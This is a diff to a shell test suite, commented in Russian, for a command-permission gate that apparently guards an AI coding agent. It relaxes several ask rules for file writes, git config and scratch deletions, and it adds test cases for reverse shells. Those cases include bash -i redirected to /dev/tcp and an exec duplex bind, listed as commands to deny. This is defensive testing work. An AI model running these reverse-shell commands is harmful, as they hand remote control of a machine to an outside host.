@@ -69,7 +69,7 @@ chk pass 'python3 -c "print(open(\"w.txt\").read())"'           'чтение ф
 chk pass 'python3 -c "import sys;sys.stdout.write(str(1))"'     'sys.stdout.write'
 chk pass 'node -e "console.log(process.version)"'               'node печатает версию'
 chk pass 'rg -n subprocess .'                                   'grep по слову subprocess'
-chk ask  'python3 -c "open(\"f\",\"w\").write(x)"'              'запись файла'
+chk pass 'python3 -c "open(\"f\",\"w\").write(x)"'              'запись файла — ask снят по аудиту 2026-08-12'
 chk ask  'python3 -c "import requests;requests.get(1)"'         'выход в сеть'
 
 section 'посегментный разбор: флаг соседа не считается своим'
@@ -81,9 +81,9 @@ chk ask  'git -C /tmp pull && ansible-playbook site.yml'        'git -C не с�
 chk ask  'make -C /tmp x && ansible-playbook site.yml'          'make -C не считается за -C'
 chk ask  'ansible-playbook -i prod site.yml'                    'обычный боевой прогон'
 chk pass 'git config --get user.email'                          'чтение конфига'
-chk ask  'git config --get user.name && git config core.hooksPath /tmp/e' 'запись после чтения'
-chk ask  'git config --list; git config --global core.pager evil' 'запись после --list'
-chk ask  'git config user.email a@b.c'                          'простая запись'
+chk ask  'git config --get user.name && git config core.hooksPath /tmp/e' 'hooksPath после чтения'
+chk pass 'git config --list; git config --global core.pager evil' 'обычная запись — ask снят, гейт только на hooksPath'
+chk pass 'git config user.email a@b.c'                          'identity-запись — рутина, ask снят'
 chk pass 'rg -F foo . && curl https://example.com/x'            'rg -F не считается за curl -F'
 chk pass 'ls -r && rm scratch.txt'                              'ls -r не считается за rm -r'
 
@@ -119,6 +119,14 @@ chk ask  'rm -rf dtdemo'                                        'каталог 
 chk pass 'rm file.txt'                                          'один файл'
 chk pass 'rm -v PROGRESS.d055b777.md TODO.55514e06.md'          'нерекурсивный -v (реальная)'
 chk pass 'rm -f private/ssh/known_hosts'                        'нерекурсивный -f (реальная)'
+# Мусорные корни освобождены по аудиту 2026-08-12 — решение per target:
+# одна небезопасная цель в списке возвращает вопрос всему вызову.
+chk pass 'rm -rf /tmp/kvt-test && cp -r x /tmp/kvt-test'        'scratch: /tmp'
+chk pass 'rm -rf "$CLAUDE_JOB_DIR/tmp/mod-probe"'               'scratch: CLAUDE_JOB_DIR в кавычках'
+chk pass 'rm -rf _site node_modules .turbo'                     'scratch: артефакты сборки'
+chk ask  'rm -rf /tmp/x /Users/x/Documents'                     'смесь scratch и настоящей цели'
+chk pass 'curl -s http://localhost:3010/api -o /tmp/svc.json'   'curl -o в /tmp (реальная)'
+chk pass 'curl -s http://x -o "$CLAUDE_JOB_DIR/tmp/page.html"'  'curl -o в CLAUDE_JOB_DIR (реальная)'
 
 section 'docker'
 chk deny 'docker volume prune'                                  'prune сносит неиспользуемые тома'
@@ -145,6 +153,19 @@ chk ask  'chmod 777 /tmp/x'                                     'chmod 777'
 chk ask  'git add -A'                                           'git add -A'
 chk pass 'rg -n foo .'                                          'обычный поиск'
 chk pass 'git status --short'                                   'git status'
+
+section 'reverse shell: /dev/tcp — deny только на настоящий шелл (аудит 2026-08-12)'
+# 6 ложных срабатываний были одинаковой формы: однонаправленная проверка порта
+# через > /dev/tcp/… без -i и без duplex-бинда обратно в stdin. Настоящий
+# reverse shell либо запускает интерактивный шелл (-i), либо сшивает stdin с
+# сокетом (0>&1, 0<&1, <>).
+chk deny 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'                'bash -i + 0>&1'
+chk deny 'sh -i >&/dev/tcp/h/9001 0>&1'                         'sh -i слитно, без пробела'
+chk deny "bash -c 'bash -i >& /dev/tcp/x/1 0>&1'"               'reverse shell внутри bash -c'
+chk deny 'exec 5<>/dev/tcp/h/443; bash <&5 >&5 2>&5'            'exec duplex-бинд + отдельный шелл'
+chk pass 'echo > /dev/tcp/192.168.20.151/22'                    'проверка порта — однонаправленная запись'
+chk pass '(echo >/dev/tcp/1.2.3.4/8006) 2>/dev/null && echo open' 'проверка порта в подшелле'
+chk pass "timeout 2 bash -c 'echo >/dev/tcp/h/22'"              'bash -c без -i — не interactive'
 
 section 'конвенциональные коммиты не должны выглядеть вызовом интерпретатора'
 # Гейт интерпретатора якорится в том числе на `(`, чтобы ловить подшелл и
@@ -229,7 +250,8 @@ chk deny 'git -C /repo branch -D feature'                          'branch -D ч
 chk deny 'git checkout -- .'                                       'сброс всех изменений'
 chk deny 'git restore .'                                           'restore точкой'
 chk ask  'git -C /repo add -A'                                     'add -A через -C'
-chk ask  'git -C /repo config user.email a@b.c'                    'запись конфига через -C'
+chk pass 'git -C /repo config user.email a@b.c'                    'identity-запись через -C — ask снят'
+chk ask  'git -C /repo config core.hooksPath /tmp/e'               'hooksPath через -C'
 chk pass 'git -C /repo status --short'                             'status через -C'
 chk pass 'git -C /repo log --oneline -5'                           'log через -C'
 chk pass 'git restore tools/claude/settings.json'                  'restore конкретного пути'
@@ -260,9 +282,9 @@ chk deny 'python3 - <<EOF
 import os
 os.system("id")
 EOF'                                                               'has по-прежнему видит код в теле'
-chk ask  'python3 - <<EOF
+chk pass 'python3 - <<EOF
 open("f","w").write(1)
-EOF'                                                               'has видит запись файла в теле'
+EOF'                                                               'запись в теле — ask снят; shell-out в теле остаётся deny'
 
 section 'heredoc: ложная открывашка не должна глотать остаток команды'
 # Первая версия пропуска взводилась по `match()` на СЫРОЙ строке — без учёта
